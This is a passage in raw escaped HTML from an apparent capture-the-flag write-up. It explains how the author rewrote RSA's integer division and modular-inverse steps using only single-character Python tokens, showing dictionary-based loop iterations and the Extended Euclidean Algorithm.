&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: [_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;], _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]][
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: [_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# iteration 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1026&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;# note how this changed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1026&lt;/span&gt;], &lt;span style=&#34;color:#75715e&#34;&gt;# note how this changed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: [_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;], _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]][
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: [_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: _[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; (repeated &lt;span style=&#34;color:#ae81ff&#34;&gt;1027&lt;/span&gt; times &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; modifications)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are many things to note here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The dictionary keys are now strings. This is purely for readibility - in the final code, they will be replaced with unique numbers as keys, since obviously we can&amp;rsquo;t have strings as a quote is already 1 character, so keys must be integers.&lt;/li&gt;
&lt;li&gt;There are numbers which are longer than 1 digit, which can&amp;rsquo;t happen. However, in the final code, this is replaced with expressions that evaluate to that number. For example, &lt;code&gt;2**1027&lt;/code&gt; has &lt;code&gt;**&lt;/code&gt; as the operator, which is 2 characters so can&amp;rsquo;t actually be used. However, we can simply express it as &lt;code&gt;2*2*2... (repeated 1027 times total)&lt;/code&gt;. Similarly with &lt;code&gt;1027&lt;/code&gt;, we can write &lt;code&gt;1027 = 8*8*8*2+3&lt;/code&gt;, and &lt;code&gt;1026 = 8*8*8*2+3 - 1&lt;/code&gt; etc.&lt;/li&gt;
&lt;li&gt;We are again using the list indexing trick for the conditionals, but we are checking for &lt;code&gt;dividend &amp;lt; multiple&lt;/code&gt; instead of &lt;code&gt;dividend &amp;gt;= multiple&lt;/code&gt; like in the original code. This is because &lt;code&gt;&amp;gt;=&lt;/code&gt; is 2 characters long, so we must use the one character operator &lt;code&gt;&amp;lt;&lt;/code&gt; instead, and swap the list elements.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Yes, there are a lot of redundant parts that could be easily golfed, but I didn&amp;rsquo;t really care about the size at that time.&lt;/p&gt;
&lt;p&gt;To repeat those 3 lines 1028 times, I used a script to format it:&lt;/p&gt;

  &lt;img src=&#34;./img/fmt-script-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;And thats how you turn one line of code, &lt;code&gt;q=N//p&lt;/code&gt;, into &lt;a href=&#34;https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/f1_fmtted_.txt&#34;&gt;almost 800k lines&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s not the end either - there&amp;rsquo;s still other places that use integer division, such as modular inverse.&lt;/p&gt;
&lt;h3 id=&#34;integer-division---in-modular-inverse-algorithm&#34;&gt;Integer division - in modular inverse algorithm&lt;/h3&gt;
&lt;p&gt;Recall our modular inverse algorithm was based off this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;modular_inverse&lt;/span&gt;(a, m):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Extended Euclidean Algorithm&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    m0, x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# q is the quotient&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; m
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Update m and a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        m, a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; m, m
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Update x0 and x1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; q &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x0, x0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Make x1 positive&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; m0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;q = a // m&lt;/code&gt;. Yeah that&amp;rsquo;s right, we&amp;rsquo;re doing this all again. Multiple times.&lt;/p&gt;
&lt;p&gt;But I&amp;rsquo;ll spare you the pain of all the debugging and formatting I had to do. The main things were that we hardcoded the modular inverse loop to run ~10 times, so we had to repeat ALL that manual division code above, 10 times. But I thought, since the numbers are smaller, they should have smaller bit lengths so we don&amp;rsquo;t need that many lines. Upon some testing, the first division turned out to require 2048 loops, and the rest were all &amp;lt;20 loops, so it wasn&amp;rsquo;t all that bad.&lt;/p&gt;
&lt;p&gt;It was a pain to debug, though. With so much code and so much room for error, I had to debug so many times. And with how large the code is, even with helper scripts, it took almost 2 minutes to run each time. It took an incredible amount of time to finally get it working.&lt;/p&gt;
&lt;p&gt;Also, another difference between the previous &lt;code&gt;q = N//p&lt;/code&gt; division is that we also had to keep track of &lt;code&gt;m0&lt;/code&gt;, &lt;code&gt;x0&lt;/code&gt;, &lt;code&gt;x1&lt;/code&gt;, and &lt;code&gt;a&lt;/code&gt; values, but this isn&amp;rsquo;t hard since you can just do something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;_[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]}{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span 